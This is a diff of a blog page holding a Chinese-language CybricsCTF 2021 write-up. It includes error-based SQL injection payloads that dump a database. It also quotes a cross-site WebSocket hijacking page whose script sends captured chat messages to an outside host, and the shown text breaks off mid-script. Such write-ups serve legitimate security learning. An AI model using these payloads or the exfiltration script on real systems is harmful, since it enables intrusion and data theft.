@@ -1,425 +1,106 @@
-<!doctype html><html lang=en-us>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
-<title>AmiaaaZ's Site | CybricsCTF2021 Wp</title>
-<meta name=viewport content="width=device-width,minimum-scale=1">
-<meta name=generator content="Hugo 0.92.2">
-<meta name=ROBOTS content="INDEX, FOLLOW">
-<link href=/dist/app.css rel=stylesheet>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
-<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | CybricsCTF2021 Wp</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.95.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
 <script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
-<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
-<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
-</head>
-<body class="bg-gray-100 text-gray-700 font-sans">
-<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
-<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
-<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
-<div>
-<h2>
-<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
-</h2>
-</div>
-<h1 class=pt-2>CybricsCTF2021 Wp</h1>
-<h3 class="text-java-700 font-normal leading-relaxed pt-2">依旧是签到水平，一些简单的misc+web+network</h3>
-<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
-<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(i,t){var n=document,s="script",e=n.createElement(s),o=n.getElementsByTagName(s)[0];e.src=i,t&&e.addEventListener("load",function(e){t(e)}),o.parentNode.insertBefore(e,o)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>CybricsCTF2021 Wp</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">依旧是签到水平，一些简单的misc+web+network</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
 &nbsp;&nbsp;
-<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
-</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-07-29T17:02:12+08:00>2021-7-29 17:02</time>
-</div>
-<details class=toc open>
-<summary>
-<hr>
-</summary>
-<div class="inline toc-content">
-<nav id=TableOfContents>
-<ul>
-<li><a href=#mic-check-cyber-baby-50-pts>Mic Check (Cyber, Baby, 50 pts)</a></li>
-<li><a href=#scanner-rebyc-baby-50-pts>Scanner (rebyC, Baby, 50 pts)</a></li>
-<li><a href=#rm--rfer-ctb-baby-166-pts>rm -rf’er (CTB, Baby, 166 pts)</a></li>
-<li><a href=#ad-network-web-baby-50-pts>Ad Network (Web, Baby, 50 pts)</a></li>
-<li><a href=#announcement-web-easy-60-pts>Announcement (Web, Easy, 60 pts)</a></li>
-<li><a href=#multichat-web-medium-138-pts>Multichat (Web, Medium, 138 pts)</a></li>
-<li><a href=#ascii-terminal-network-baby-116-pts>ASCII Terminal (Network, Baby, 116 pts)</a></li>
-<li><a href=#lx-100-network-easy-192-pts>LX-100 (Network, Easy, 192 pts)</a></li>
-<li><a href=#localhost-network-hard-267-pts>localhost (Network, Hard, 267 pts)</a></li>
-</ul>
-</nav>
-</div>
-</details>
-<hr>
-</div>
-</header>
-<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
-<article>
-<section class="mx-auto content">
-<div class=c-rich-text><h2 id=mic-check-cyber-baby-50-pts>Mic Check (Cyber, Baby, 50 pts)</h2>
-<blockquote>
-<p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p>
-<p>Those organizers are changing <a href=https://cybrics.net/rules>game rules</a> all the time! There’s a flag there, and it’s not that easy to capture.</p>
-<p><strong>Also be sure to join <a href=https://t.me/cybrics>@cybrics Telegram chat</a></strong> for challenge-related announcements and contacting orgs in case all goes wrong</p>
-<p><strong>Added at 10:10 —</strong> looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely</p>
-</blockquote>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png alt=image-20210724194428638></p>
-<h2 id=scanner-rebyc-baby-50-pts>Scanner (rebyC, Baby, 50 pts)</h2>
-<blockquote>
-<p>Author: Mikhail Driagunov (<a href=https://t.me/aethereternity>@aethereternity</a>)</p>
-<p>Check out this cool new <a href=https://scanner-cybrics2021.ctf.su/><strong>game</strong></a>!</p>
-<p>I heard they serve flags at level 5.</p>
-</blockquote>
-<p>不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面</p>
-<p>首先用<a href=https://gifsuper.com/>Gif Super</a>把帧间隔调为300ms，然后裁剪出中间有用的部分 放入<a href="http://www.atoolbox.net/Tool.php?Id=979">GIF动态图片分解</a>中看结果 都有在线工具就很方便</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png alt=image-20210724202614568></p>
-<p>所以这个破玩意到底是啥？猪？还是刺猬？
-别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone&mldr;. 最后一个是二维码 比较麻烦</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png alt=image-20210724203314255></p>
-<p>再稍微调整一下尺寸，扫描就行了<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png alt=image-20210724203713402></p>
-<h2 id=rm--rfer-ctb-baby-166-pts>rm -rf’er (CTB, Baby, 166 pts)</h2>
-<blockquote>
-<p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p>
-<p>Alarm! We accidentally did <code>rm -rf /*</code> on a very important server. Now all that’s left is one shell session.</p>
-<pre tabindex=0><code>ssh rmrfer@178.154.210.26
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-07-29T17:02:12+08:00>2021-7-29 17:02</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#mic-check-cyber-baby-50-pts>Mic Check (Cyber, Baby, 50 pts)</a></li><li><a href=#scanner-rebyc-baby-50-pts>Scanner (rebyC, Baby, 50 pts)</a></li><li><a href=#rm--rfer-ctb-baby-166-pts>rm -rf’er (CTB, Baby, 166 pts)</a></li><li><a href=#ad-network-web-baby-50-pts>Ad Network (Web, Baby, 50 pts)</a></li><li><a href=#announcement-web-easy-60-pts>Announcement (Web, Easy, 60 pts)</a></li><li><a href=#multichat-web-medium-138-pts>Multichat (Web, Medium, 138 pts)</a></li><li><a href=#ascii-terminal-network-baby-116-pts>ASCII Terminal (Network, Baby, 116 pts)</a></li><li><a href=#lx-100-network-easy-192-pts>LX-100 (Network, Easy, 192 pts)</a></li><li><a href=#localhost-network-hard-267-pts>localhost (Network, Hard, 267 pts)</a></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><h2 id=mic-check-cyber-baby-50-pts>Mic Check (Cyber, Baby, 50 pts)</h2><blockquote><p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p><p>Those organizers are changing <a href=https://cybrics.net/rules>game rules</a> all the time! There’s a flag there, and it’s not that easy to capture.</p><p><strong>Also be sure to join <a href=https://t.me/cybrics>@cybrics Telegram chat</a></strong> for challenge-related announcements and contacting orgs in case all goes wrong</p><p><strong>Added at 10:10 —</strong> looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely</p></blockquote><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png alt=image-20210724194428638></p><h2 id=scanner-rebyc-baby-50-pts>Scanner (rebyC, Baby, 50 pts)</h2><blockquote><p>Author: Mikhail Driagunov (<a href=https://t.me/aethereternity>@aethereternity</a>)</p><p>Check out this cool new <a href=https://scanner-cybrics2021.ctf.su/><strong>game</strong></a>!</p><p>I heard they serve flags at level 5.</p></blockquote><p>不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面</p><p>首先用<a href=https://gifsuper.com/>Gif Super</a>把帧间隔调为300ms，然后裁剪出中间有用的部分 放入<a href="http://www.atoolbox.net/Tool.php?Id=979">GIF动态图片分解</a>中看结果 都有在线工具就很方便</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png alt=image-20210724202614568></p><p>所以这个破玩意到底是啥？猪？还是刺猬？
+别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone&mldr;. 最后一个是二维码 比较麻烦</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png alt=image-20210724203314255></p><p>再稍微调整一下尺寸，扫描就行了<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png alt=image-20210724203713402></p><h2 id=rm--rfer-ctb-baby-166-pts>rm -rf’er (CTB, Baby, 166 pts)</h2><blockquote><p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p><p>Alarm! We accidentally did <code>rm -rf /*</code> on a very important server. Now all that’s left is one shell session.</p><pre tabindex=0><code>ssh rmrfer@178.154.210.26
 Password: sa7Neiyi
-</code></pre><p>Rescue the <strong>flag.txt</strong> file from one of the directories by only using your shell</p>
-<p><strong>Added at 13:45 —</strong> frequent question: yes, if you found <code>flag.txt</code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you</p>
-</blockquote>
-<p>这个题 emmmmm
-只要ssh一连接就会自动执行<code>rm -rf /*</code>的指令，当反应过来的时候系统已经删的连ls指令都不剩了</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png alt=image-20210729003620922></p>
-<p>先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了<code>rm -rf /*</code>，之后就可以顺畅的穿梭于这个buildbox之间拿flag了</p>
-<p>预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成"read"的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中<code>echo $&lt;</code>命令相当于<code>read</code>函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload <code>(echo "$&lt;") &lt; /etc/ctf/flag.txt</code>，即 读取flag.txt并输出</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png alt=image-20210729005544665></p>
-<h2 id=ad-network-web-baby-50-pts>Ad Network (Web, Baby, 50 pts)</h2>
-<blockquote>
-<p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p>
-<p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.</p>
-<p><a href=http://adnetwork-cybrics2021.ctf.su/>Adnetwork website</a></p>
-<p>There is a flag 1337 redirects deep into the network&mldr;</p>
-</blockquote>
-<p><del>这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？</del></p>
-<p>emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
-这个图在昨天做的时候看到， 内容是 <em>awesome ad from adnetwork</em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&mldr;&mldr; <del>（都怪edge!!!</del></p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png alt=image-20210725133924877></p>
-<p>点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png alt=image-20210725134346221></p>
-<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
-
-<span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&#34;</span>
-<span style=color:#00a8c8>for</span> <span style=color:#111>_</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>1337</span><span style=color:#111>):</span>
-	<span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>allow_redirects</span><span style=color:#f92672>=</span><span style=color:#00a8c8>False</span><span style=color:#111>)</span>
-    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>[</span><span style=color:#ae81ff>9</span><span style=color:#111>:</span><span style=color:#f92672>-</span><span style=color:#ae81ff>18</span><span style=color:#111>]</span>
-<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>)</span>
-
-</code></pre></div><p>emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p>
-<p>比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便</p>
-<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
-
-<span style=color:#111>session</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>Session</span><span style=color:#111>()</span>
-<span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>max_redirects</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span>
-
-<span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&#34;</span>
-<span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>allow_redirects</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
-
-<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
-<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>url</span><span style=color:#111>)</span>
-
-</code></pre></div><h2 id=announcement-web-easy-60-pts>Announcement (Web, Easy, 60 pts)</h2>
-<blockquote>
-<p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p>
-<p>Ladies and gentlemen!</p>
-<p>Allow us to introduce a brand new project —
-⚐ The Flag</p>
-<p><a href=http://announcement-cybrics2021.ctf.su/>Announcement website</a></p>
-</blockquote>
-<p>简约漂亮的前端</p>
-<p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&email=xxxx
-尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&lsquo;<a href=mailto:1@1.com>1@1.com</a>&rsquo;) 随email而改变，尝试注入</p>
-<pre tabindex=0><code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;email='or'1		// 回显正常 无报错
-digest=c3593d255957d60d5d489ae682da8aee&amp;email=1')#		// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
-digest=5c07c683d062d17ec799fa177ce88058&amp;email=1',1)#	// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
-</code></pre><p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？</p>
-<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#00a8c8>insert</span> <span style=color:#00a8c8>into</span> <span style=color:#00a8c8>table_name</span> <span style=color:#111>(</span><span style=color:#111>email</span><span style=color:#111>,</span> <span style=color:#00a8c8>timestamp</span><span style=color:#111>)</span> <span style=color:#00a8c8>values</span> <span style=color:#111>(</span><span style=color:#111>email</span><span style=color:#111>,</span> <span style=color:#111>now</span><span style=color:#111>());</span>
-</code></pre></div><p>可利用的部分是可以插入的email，报错注入</p>
-<pre tabindex=0><code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#		// Something went wrong during database insert: XPATH syntax error: '~announcement'
-digest=c9f14624524736a74164cc6024fdefce&amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '	// Something went wrong during database insert: XPATH syntax error: '~emails,logs'
-digest=94707222b90505ab0aa5e1fd3916e77d&amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '	// Something went wrong during database insert: XPATH syntax error: '~log'
-digest=66bf6db11d9bee8e897b874a430f5704&amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '	// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
-</code></pre><p>没什么好说的，经典报错注入流程：确定字段数->爆数据库名(announcement)->表名(emails, logs)->字段名(log)->具体数据 拿flag</p>
-<h2 id=multichat-web-medium-138-pts>Multichat (Web, Medium, 138 pts)</h2>
-<blockquote>
-<p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p>
-<p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.</p>
-<p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &ldquo;<code>Hey, i forgot the flag. Can you remind me?</code>&rdquo;. Then admin will tell him the flag.</p>
-<p><a href=http://multichat-cybrics2021.ctf.su/>Multichat website</a></p>
-<p>Team token for the support call: <code>p32vhJKrnx_hajUc8nLTFw</code></p>
-</blockquote>
-<p>聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样</p>
-<p>抓包，看到了<code>Connection: Upgrade</code> <code>Upgrade: websocket</code>，这个聊天室是建立了一个websocket连接</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png alt=image-20210724225447805>（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面</p>
-<p>链接里的一个csrf攻击的实例跟这个有点像了</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png alt=image-20210724232946228></p>
-<p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（<em>Admin and tech support are members of a secret chat room.</em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag</p>
-<p>（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png alt=image-20210728001013129></p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png alt=image-20210728001122843></p>
-<p>5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是<a href=https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw>来自w&m的脚本</a></p>
-<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;/</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;</span><span style=color:#f92672>script</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;text/javascript&#34;</span><span style=color:#111>&gt;</span>
-    <span style=color:#00a8c8>var</span> <span style=color:#75af00>conn</span><span style=color:#111>;</span>
-    <span style=color:#00a8c8>function</span> <span style=color:#75af00>connect</span><span style=color:#111>()</span> <span style=color:#111>{</span>
-
-            <span style=color:#75af00>conn</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>WebSocket</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ws://multichat-cybrics2021.ctf.su/ws&#34;</span><span style=color:#111>);</span>
-            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onclose</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
-                <span style=color:#00a8c8>var</span> <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>;</span>
-                <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>code</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>1003</span><span style=color:#111>)</span> <span style=color:#111>{</span>
-                    <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`Status: </span><span style=color:#d88200>${</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>reason</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>;</span>
-                <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
-                    <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;Connection closed.&#34;</span><span style=color:#111>;</span>
-                <span style=color:#111>}</span>
-                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#75af00>item</span><span style=color:#111>))</span>
-            <span style=color:#111>};</span>
-            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onopen</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
